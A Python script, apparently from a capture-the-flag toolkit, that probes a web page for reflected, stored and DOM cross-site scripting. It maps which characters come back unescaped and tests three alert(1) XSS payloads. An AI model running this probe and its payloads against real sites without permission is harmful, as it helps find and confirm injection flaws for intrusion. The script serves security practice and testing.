#!/usr/bin/env python3
"""Check where/how input is reflected (context finder for XSS) and which
special characters survive unescaped.

    python xss_reflect.py "http://xss1.chal.deti:8021/?q=FUZZ"
    python xss_reflect.py http://t/comment --data "name=a&text=FUZZ" --then http://t/
"""
import argparse
import re
from urllib.parse import quote

import requests

MARK = "zq9x"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data")
    ap.add_argument("--then", help="page to fetch afterwards (stored XSS)")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}
    probe = f"{MARK}'\"<>`(){{}};/{MARK}"

    def send(v):
        q = quote(v, safe="")
        if a.data:
            r = requests.post(a.url, data=a.data.replace("FUZZ", q), headers={**hdr,
                              "Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
        else:
            r = requests.get(a.url.replace("FUZZ", q), headers=hdr, timeout=15)
        if a.then:
            r = requests.get(a.then, headers=hdr, timeout=15)
        return r.text

    t = send(probe)
    if MARK not in t:
        print("[-] marker not in response → not reflected server-side (DOM XSS? check JS sinks: dom.md)")
        if re.search(r"innerHTML|document\.write|location\.(search|hash)|URLSearchParams", t):
            print("[+] page JS has DOM sources/sinks — likely DOM XSS")
        return
    for m in re.finditer(re.escape(MARK), t):
        ctx = t[max(0, m.start() - 60): m.end() + 60].replace("\n", " ")
        print(f"[ctx] ...{ctx}...")
    seg = re.search(re.escape(MARK) + r"(.*?)" + re.escape(MARK), t, re.S)
    if seg:
        got = seg.group(1)
        for ch in "'\"<>`(){};/":
            print(f"   {ch!r}: {'RAW' if ch in got else 'encoded/stripped'}")
    for p in ["<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>", "'-alert(1)-'"]:
        print(f"[test] {p} -> {'REFLECTED RAW' if p in send(p) else 'no'}")


if __name__ == "__main__":
    main()
